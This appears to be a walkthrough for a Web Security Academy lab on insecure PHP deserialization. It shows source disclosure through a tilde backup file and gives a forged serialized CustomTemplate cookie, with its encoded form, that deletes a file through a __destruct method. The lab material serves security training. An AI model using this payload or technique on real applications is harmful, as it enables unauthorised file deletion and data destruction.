@@ -1,0 +1,35 @@
+When you start the lab, notice that the "/libs/CustomTemplate.php" file is mentioned
+in the HTML source code:
+    <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
+If you try to access the page
+    https://<YOUR-LAB-ID>.web-security-academy.net/libs/CustomTemplate.php
+You will be greeted by a blank page. But if you check the hint:
+    "You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file."
+Hence you access:
+    https://<YOUR-LAB-ID>.web-security-academy.net/libs/CustomTemplate.php~ (see how the tilde is appended)
+You will get in output the PHP code "CustomTemplate.php" available in this folder
+
+After careful reading, we notice the following things
+
+The class is the file is called "CustomTemplate" and it has two attributes:
+    private $template_file_path;
+    private $lock_file_path;
+
+We find this interesting function
+function __destruct() {
+    // Carlos thought this would be a good idea
+    if (file_exists($this->lock_file_path)) {
+        unlink($this->lock_file_path);
+    }
+}
+
+So if we can really pass any object in the session and it will be serialized, we can make up a CustomTemplate object
+and bind the "/home/carlos/morale.txt" file to the lock_file_path variable, and it will be actually deleted.
+
+So we build the following serialized object:
+    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+
+Which Base64 + URL Encoded becomes
+    TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
+
+We replace the session cookie, refresh the page and the lab is indeed solved!
